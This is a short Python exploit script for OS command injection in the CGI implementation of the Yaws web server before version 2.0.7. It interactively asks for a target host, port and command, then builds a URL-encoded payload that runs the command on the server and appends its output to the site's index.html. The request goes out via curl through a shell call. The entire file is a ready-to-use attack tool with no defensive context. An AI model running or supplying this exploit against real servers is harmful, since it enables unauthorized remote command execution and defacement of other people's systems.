import requests
import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'
    green = '\033[0;32m'


class OsCommandInjection(object):
    def __init__(self, domain, command, serv_port, uri, ):
        self.domain = domain
        self.command = command
        self.serv_port = serv_port
        self.uri = uri

    def injection(self):
        payload = self.uri + "://" + self.domain + ":" + self.serv_port + "/cgi-bin/%22%60export%20Z=$(pwd%7Ccut%20-c1);" + self.command + "%3E%3E..$Z%22%22index.html%60%22"
        sub.call(f"""curl '{payload}'""", shell=True)


if __name__ == '__main__':
    command_injection = OsCommandInjection(domain=input(
        f"{Colors.red}(CGI implementation In Yaws Web Server <2.0.7 OS Command Injection){Colors.end} [Enter Domain]:~#"),
                                           uri=input(
                                               f"{Colors.red}(CGI implementation In Yaws Web Server <2.0.7 OS Command Injection){Colors.end} [Enter Domain URI (http, https, ftp)]:~#"),
                                           serv_port=input(
                                               f"{Colors.red}(CGI implementation In Yaws Web Server <2.0.7 OS Command Injection){Colors.end} [Enter Server Port]:~#"),
                                           command=input(
                                               f"{Colors.red}(CGI implementation In Yaws Web Server <2.0.7 OS Command Injection){Colors.end} [Enter URL Encoded Command]:~#"), )
    command_injection.injection()
